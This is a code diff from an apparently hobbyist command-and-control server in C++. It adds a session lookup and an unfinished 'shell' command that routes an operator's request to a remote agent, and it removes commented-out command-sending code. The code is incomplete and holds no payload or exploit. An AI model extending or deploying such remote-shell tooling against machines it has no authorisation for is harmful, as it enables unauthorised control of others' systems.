@@ -157,9 +157,38 @@ void server::get_active_agents(int client_fd){//function to get active agent ses
 }
 
 
-void server::command_dispatcher(std::string command, int client_fd){
-    if(command == "sessions"){
+
+int server::agentLookup(uint32_t session_id){
+    std::cout << "[*] performing agent lookup using session registry table" << std::endl;
+    {
+        std::unique_lock<std::mutex> lock(session_reg_mutex);
+        auto check = session_registry.find(session_id);// returns an iterator. an iterator is a pointer like object so auto is used for datatype compatibility
+        if(check == session_registry.end()){ // .end() and .find() return an iterator which help us access the key value pair element and if it doesn't return an iterator then element not found
+            std::cout << "[!]session_id not found" << std::endl;
+            return -1;
+        }
+        std::cout << "[+]session_id found" << std::endl;
+        int agent_fd = check->second.client_fd;
+        return agent_fd;
+    }
+}
+
+
+
+void server::command_dispatcher(const packet &received_packet, int client_fd){
+    if(received_packet.payload == "sessions"){ // get active agents in the network and send the data back to operator console
         get_active_agents(client_fd);
+    }
+    else if(received_packet.payload == "shell"){ // based on the sid choose the corresponding client_fd from the session registry to send the command to the agent
+        // find session_registry[received_packet.session_id]
+        // get that agent's client_fd
+        // send shell-start packet to that agent
+        int agent_fd = agentLookup(received_packet.session_id);
+        if(agent_fd < 0){
+            std::cout << "[!]agent lookup failed. agent doesn't exist" << std::endl;
+            return;
+        }
+        
     }
 }
 
@@ -177,7 +206,7 @@ std::vector<uint8_t> serialization(const packet &p1){ // CURRENTLY NOT USED !!! 
         common::code_exit();
     } 
 
-    // converting the packet_bytes (unsigned integers) to network bytes or big endian
+    // converting the pacsession_idket_bytes (unsigned integers) to network bytes or big endian
     uint32_t message_type = htonl(p1.message_type);
     uint32_t session_id = htonl(p1.session_id);
     uint32_t payload_length = htonl(p1.payload.size());
@@ -242,32 +271,6 @@ int server::get_session_id(){
 
 
 
-// int server::choose_session(){
-//     uint32_t session_id;
-//     std::cout << "Choose session_id : ";
-//     std::cin >> session_id;
-//     if(session_registry.contains(session_id)){
-//         return session_id;
-//     }    
-//     else{
-//         std::cout << "[*] invalid session input" << std::endl;
-//         return -1;
-//     }
-// }
-
-
-// void server::send_commands_agent(int soc_fd, int session_id){ // send message to client
-//     std::string command;
-//     packet p1;
-//     // std::cout << "Enter command : " << std::endl;
-//     // std::getline(std::cin >> std::ws, command);
-//     p1 = packet_wrapping(command, session_id);
-//     std::vector<uint8_t> byte_array = serialization(p1);
-//     // instead of soc_fd we need to send session_registry[session_id] to send commands to that particular data only
-//     if(send(soc_fd, byte_array.data(), byte_array.size(), 0) < 0){
-//         common::code_exit();
-//     }
-// }
 
 
 void server::detect_active_agents(int client_fd, int session_id){
@@ -428,7 +431,10 @@ void server::operator_listener(){
             // Starting Dispatch
             std::cout << "[+]PAYLOAD : " << received_packet.payload << std::endl;
             if(received_packet.message_type == MESSAGE_COMMAND){
-                command_dispatcher(received_packet.payload, client_fd);
+                command_dispatcher(received_packet, client_fd); // automatically passes the address of the packet structure without having to deal with complex pointers and dereferencing
+            }
+            else if(received_packet.message_type == MESSAGE_SHELL_START){
+                command_dispatcher(received_packet, client_fd);
             }
             else{
                 std::cout << "[!]unsupported MESSAGE_TYPE : " << received_packet.message_type << std::endl;
